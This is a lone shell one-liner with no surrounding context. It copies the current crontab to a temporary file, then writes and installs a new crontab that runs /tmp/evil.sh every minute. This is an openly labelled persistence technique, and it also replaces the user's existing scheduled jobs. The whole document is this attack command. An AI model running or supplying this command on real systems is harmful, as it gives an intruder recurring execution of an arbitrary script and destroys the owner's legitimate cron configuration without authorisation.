crontab -l > /tmp/notevil; echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil